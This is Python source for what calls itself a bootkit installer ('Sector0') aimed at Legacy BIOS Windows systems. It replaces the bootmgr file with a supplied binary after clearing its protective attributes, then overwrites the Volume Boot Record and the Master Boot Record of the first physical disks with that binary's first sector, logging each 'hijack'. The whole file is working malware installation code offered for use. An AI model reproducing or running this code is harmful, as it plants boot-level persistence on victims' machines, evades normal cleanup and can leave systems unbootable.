"""
Sector0 - Legacy BIOS Boot Installer
=======================================
Handles MBR/VBR hijacking for Legacy BIOS systems.
"""

import os
import subprocess
import shutil
from typing import Optional

from .utils import log, run_cmd_safe
from .disk import DiskManager


class LegacyBootInstaller:
    """Installs bootkit on Legacy BIOS systems."""
    
    def __init__(self, disk_manager: DiskManager, config: dict):
        """
        Initialize Legacy BIOS installer.
        
        Args:
            disk_manager: DiskManager instance
            config: Configuration dictionary with binary paths
        """
        self.disk = disk_manager
        self.config = config
        self.mounted_drive = None
        
    def install(self) -> bool:
        """
        Perform full Legacy BIOS bootkit installation.
        
        Returns:
            True on success
        """
        binary_path = self.config.get("binary_path")
        
        if not binary_path or not os.path.exists(binary_path):
            log(f"Bootloader binary not found: {binary_path}", "ERROR")
            return False
        
        try:
            # Mount system partition
            volume = self.disk.find_system_volume(is_uefi=False)
            if not volume:
                log("System partition not found", "ERROR")
                return False
            
            self.mounted_drive = self.disk.mount_volume(volume)
            log(f"Mounted system partition at {self.mounted_drive}", "INFO")
            
            # Copy bootmgr replacement
            if self.config.get("replace_bootmgr", True):
                self._replace_bootmgr(binary_path)
            
            # Write to VBR
            if self.config.get("write_vbr", True):
                self._write_vbr(binary_path)
            
            # Write to MBR
            if self.config.get("write_mbr", True):
                self._write_mbr(binary_path)
            
            log("Legacy BIOS installation completed", "INFO")
            return True
            
        except Exception as e:
            log(f"Installation failed: {e}", "ERROR")
            return False
            
        finally:
            if self.mounted_drive:
                self.disk.unmount_volume(self.mounted_drive)
    
    def _replace_bootmgr(self, binary_path: str):
        """Replace bootmgr file with our binary."""
        dest_name = self.config.get("dest_name", "bootmgr")
        dest_path = os.path.join(self.mounted_drive, dest_name)
        
        # Backup original
        if os.path.exists(dest_path) and self.config.get("create_backup", True):
            backup_path = os.path.join(self.mounted_drive, f"{dest_name}.bak")
            try:
                self._copy_file(dest_path, backup_path)
                log(f"Backed up original {dest_name}", "INFO")
            except Exception as e:
                log(f"Backup failed: {e}", "WARN")
        
        # Remove attributes from existing file
        if os.path.exists(dest_path):
            subprocess.run(
                f'attrib -R -S -H "{dest_path}"', 
                shell=True, 
                capture_output=True
            )
            try:
                os.remove(dest_path)
            except:
                subprocess.run(
                    f'del /F /Q "{dest_path}"',
                    shell=True,
                    capture_output=True
                )
        
        # Copy new binary
        if self._copy_file(binary_path, dest_path):
            log(f"Replaced {dest_name} ({os.path.getsize(dest_path)} bytes)", "INFO")
        else:
            log(f"Failed to replace {dest_name}", "ERROR")
    
    def _copy_file(self, src: str, dst: str) -> bool:
        """
        Copy file using multiple methods until one works.
        
        Returns:
            True on success
        """
        # Method 1: Windows copy command
        result = subprocess.run(
            f'copy /Y /B "{src}" "{dst}"',
            shell=True,
            capture_output=True
        )
        if os.path.exists(dst) and os.path.getsize(dst) > 0:
            return True
        
        # Method 2: Python shutil
        try:
            shutil.copy2(src, dst)
            if os.path.exists(dst):
                return True
        except:
            pass
        
        # Method 3: xcopy
        dir_path = os.path.dirname(dst)
        result = subprocess.run(
            f'xcopy /Y /H /R "{src}" "{dir_path}\\"',
            shell=True,
            capture_output=True
        )
        temp_dst = os.path.join(dir_path, os.path.basename(src))
        if os.path.exists(temp_dst):
            if temp_dst != dst:
                os.rename(temp_dst, dst)
            return True
        
        return False
    
    def _write_vbr(self, binary_path: str):
        """Write bootloader to Volume Boot Record."""
        drive_letter = self.mounted_drive.rstrip('\\').rstrip(':')
        volume_path = f"\\\\.\\{drive_letter}:"
        
        with open(binary_path, 'rb') as f:
            bootloader = f.read(512)
        
        if self.disk.write_sector(volume_path, bootloader):
            log("VBR hijacked successfully", "INFO")
        else:
            log("VBR write failed", "WARN")
    
    def _write_mbr(self, binary_path: str):
        """Write bootloader to Master Boot Record."""
        with open(binary_path, 'rb') as f:
            bootloader = f.read(512)
        
        # Try first two physical disks
        for disk_num in [0, 1]:
            disk_path = f"\\\\.\\PhysicalDrive{disk_num}"
            if self.disk.write_sector(disk_path, bootloader, preserve_partition_table=True):
                log(f"MBR written to disk {disk_num}", "INFO")
                return
        
        log("MBR write failed on all disks", "WARN")
